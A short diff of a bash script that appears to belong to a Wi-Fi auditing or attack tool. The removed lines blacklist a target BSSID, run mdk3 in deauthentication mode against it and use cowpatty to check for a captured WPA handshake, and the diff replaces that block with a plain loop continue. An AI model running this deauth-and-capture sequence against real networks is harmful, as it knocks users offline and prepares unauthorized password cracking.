@@ -190,24 +190,8 @@ Run_Config() {
 			pkill airodump-ng
 		    break
 		    
-		else
-			sleep 6
-			echo > blacklist.txt $bssid
-			xterm -e mdk3 $mon d -b blacklist.txt &
-			sleep 15
-			pkill mdk3
-			sleep 3
-			cowpatty -c -r $HANDSHAKE >/dev/null 2>&1
-			Stat=$?
-			if [ $Stat -eq 0 ] ;then
-				break
-				
-
-			else
-				sleep 4
-				continue
-			
-			fi
+		else	
+		        continue
 			
 
 		fi
